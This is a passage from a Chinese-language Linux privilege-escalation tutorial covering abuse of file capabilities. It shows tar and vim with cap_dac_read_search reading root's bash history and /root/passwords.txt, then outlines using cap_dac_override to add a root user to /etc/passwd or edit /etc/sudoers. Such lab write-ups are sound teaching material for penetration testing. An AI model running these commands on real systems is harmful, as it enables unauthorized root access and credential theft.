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" width="828" height="209" class="img_ev3q"></p>
<p>就像我们在 perl 中看到的那样，他们在 tar 命令中使用变量；但是，我们可以将第二个命令中的 $LFILE 替换为我们感兴趣的文件名，例如 root 的 bash 历史文件 - 作为示例。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/tar xf &quot;/root/.bash_history&quot; -I &#x27;/bin/sh -c &quot;cat 1&gt;&amp;2&quot;&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305517-689165858-3093c10a42b8cdd5bfda3328e9713256.png" width="902" height="187" class="img_ev3q"></p>
<p>有趣的是...在这里我们可以看到，通过转储 root 的 bash 历史记录文件，我们被提示在 root目录中存在一个名为 <strong>passwords.txt</strong> 的文件，而如果我们没有先检查这个文件，那就不会知道它的存在。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="314cap_dac_read_search--vim"><strong><div id="id3.1.4">3.1.4、cap_dac_read_search – vim</div></strong><a href="#314cap_dac_read_search--vim" class="hash-link" aria-label="314cap_dac_read_search--vim的直接链接" title="314cap_dac_read_search--vim的直接链接">​</a></h6>
<p>作为特权文件读取的最后一个示例，我们将使用文本编辑器“vim”打开文件并查看其内容。检查 GTFOBins 后，我们会看到以下内容：</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="827" height="157" class="img_ev3q"></p>
<p>非常简单，我们只需运行 vim 命令，然后运行我们要读取的文件。由于我们在上一个示例中的 /root 目录中发现了一个有趣的文件，名为 passwords.txt，因此让我们检查一下。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/vim /root/passwords.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305779-964274855-6dbb19a9f70ed6383c8ed3c11d002421.png" width="667" height="413" class="img_ev3q"></p>
<p>该文件里面是一份密码列表（正如预期的那样）。现在，我们可以拿着这份密码列表，尝试将它们输入到我们能输入的任何地方，希望其中一个密码能让我们更接近 root shell。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32cap_dac_override"><strong><div id="id3.2">3.2、cap_dac_override</div></strong><a href="#32cap_dac_override" class="hash-link" aria-label="32cap_dac_override的直接链接" title="32cap_dac_override的直接链接">​</a></h4>
<p>cap_dac_override 功能为用户提供了写入文件系统中任意文件的能力，其中包括 root 拥有的所有文件。如果我们发现二进制文件（例如文本编辑器（vim、nano 等）或脚本语言（python、perl、node 等））被分配了此功能…请注意！</p>
<p>我们认为读取 root 文件是危险的，想象一下如果我们能够写入任何 root 文件，我们会做什么？好吧，首先，我们可以在 /etc/passwd 文件中创建一个 root 用户，或者通过编辑 /etc/sudoers 文件为用户提供完整的 sudo 权限。我们可以使用许多选项来提升我们的权限，我们只需要稍微考虑一下。</p>
<p>从 PEAS 和手动枚举的输出中，我们可以看到以下二进制文件启用了 cap_dac_override 功能：<strong>python3</strong>、<strong>vim</strong>。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="321cap_dac_override--python3"><strong><div id="id3.2.1">3.2.1、cap_dac_override – python3</div></strong><a href="#321cap_dac_override--python3" class="hash-link" aria-label="321cap_dac_override--python3的直接链接" title="321cap_dac_override--python3的直接链接">​</a></h6>
<p>再次利用 GTFObins，我们可以检查python(3) 的 <strong>File Write</strong> 条目。</p>
